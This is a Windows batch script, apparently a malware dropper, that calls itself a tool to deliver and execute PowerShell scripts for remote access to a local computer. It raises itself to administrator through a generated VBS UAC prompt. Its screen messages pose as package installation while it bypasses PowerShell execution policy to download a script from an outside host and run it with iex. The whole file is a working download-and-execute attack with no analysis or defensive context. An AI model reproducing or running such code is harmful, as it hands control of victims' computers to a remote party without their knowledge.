@echo on
rem *******************************************************
rem deliverexec.bat
rem This Script will Deliver and Execute 
rem Powershell Scripts for Downloading
rem Remote Utilities for Remote Access to a Local Computer
rem *******************************************************
@echo off

rem Initialization of Variables

SetLocal EnableExtensions EnableDelayedExpansion

rem Set a Directory
rem

set CURDIR=%CD%

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem Set a Vatiable

set pathCMD=%SystemRoot%\system32
set POSHEXE=%pathCMD%\WindowsPowerShell\v1.0\powershell.exe

rem Set Host Variables
rem
set aHTTP_pref=http
set aHTTP_domain=win.netip4.ru
set aHTTP_port=80
set aRemoteDir=/Apps/nit/Downloads/RU/NIT-RU-Unblock/
set a_Host=%aHTTP_pref%://%aHTTP_domain%:%aHTTP_port%%aRemoteDir%

rem Set a File
rem
set aDeliveryPS=RU-NIT-Deliver001.ps1

rem Set Local and Remote Paths
rem
set aRemotePath=%a_Host%%aDeliveryPS%
set aLocalPath=%TPDL%\%aDeliveryPS%

echo Check System Integrity....
rem
if not exist %POSHEXE% echo %POSHEXE% is not Found! && exit /b 1
if not exist %TPDL% echo %TPDL% is not Found! && exit /b 1
rem

echo Download and Run Payload..
rem
title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
rem exit /b 17
rem
set getadminvbs=nit-%~n0.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%TPDL%\%getadminvbs%"

    %wscriptexe% "%TPDL%\%getadminvbs%"
    del "%TPDL%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...

rem Run a Payloads...
rem
echo Download and Execute a File %aDeliveryPS%...
rem
%POSHEXE% -NoProfile -ExecutionPolicy Bypass -Command "(new-object Net.WebClient).DownloadString('%aRemotePath%') | iex"

:End
echo The End of the Script %0
exit /b 0

